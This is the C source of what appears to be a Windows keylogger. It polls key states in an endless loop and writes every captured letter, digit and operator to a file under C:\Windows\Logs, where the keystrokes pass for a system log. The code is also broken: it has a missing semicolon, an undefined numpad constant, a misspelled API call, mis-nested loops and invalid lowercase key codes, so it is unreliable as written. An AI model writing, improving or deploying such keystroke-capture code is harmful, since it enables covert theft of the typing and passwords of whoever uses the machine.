# include <stdio.h>
# include <windows.h>
int main(){
 //Create file.txt
 const char *route = ("C:\\Windows\\Logs\\logsData.txt");
 FILE *f = fopen(route, "w"); //f is file
 if(f == NULL){
  perror("Error creating file");
  return 1;
 }
 char mayusArr[] = {
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
 };
char minusArr[] = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m',
    'n','o','p','q','r','s','t','u','v','w','x','y','z'
};

char numsArr[] = {
'0','1','2','3','4','5','6','7','8','9'
};

char operatorsArr[] = {'+', '-', '*', '/', '%', '='
};


while(1){
    
 int mayusArrLen = sizeof(mayusArr) / sizeof(mayusArr[0]); // MayusArray Length
 int minusArrLen = sizeof(minusArr) / sizeof(minusArr[0]); // MinusArray Lenght
 int numsArrLen = sizeof(numsArr) / sizeof(numsArr[0]); // Numerical chars
 int operatorsArrLen = sizeof(operatorsArr) / sizeof(operatorsArr[0]);


 for(int x = 0; x<mayusArrLen;x++){
 if(GetAsyncKeyState(mayusArr[x]) & 0x8000){
  fprintf(f,"%c",mayusArr[x]);
  fflush(f);
 }
 for(int y = 0; y<minusArrLen;y++){
  if(GetAsyncKeyState(minusArr[y])){
   fprintf(f,"%c",minusArr[y]);
   fflush(f);
  }
 }
 for(int z = 0; z<numsArrLen;z++)//Numpad Keys
 if(GetAsyncKeyState(VK_NUMPAD+z) & 0x8000){
  fprintf(f,"%c",numsArr[z])
  fflush(f);
  }
 }
 for(int x = 0 ; x<numsArrLen;x++){
 if(GetAsyncKeyState(numsArr[x])){
  fprintf(f,"%c",numsArr[x]);
  fflush(f);
  }
 }
 for(int l = 0;l<operatorsArrLen;l++){ 
  if(GetAsignKeyState(operatorsArr[l])){
   fprintf(f, "%c",operatorsArr[l]);
   fflush(f);
  }
 }







}//END WHILE
}//END MAIN
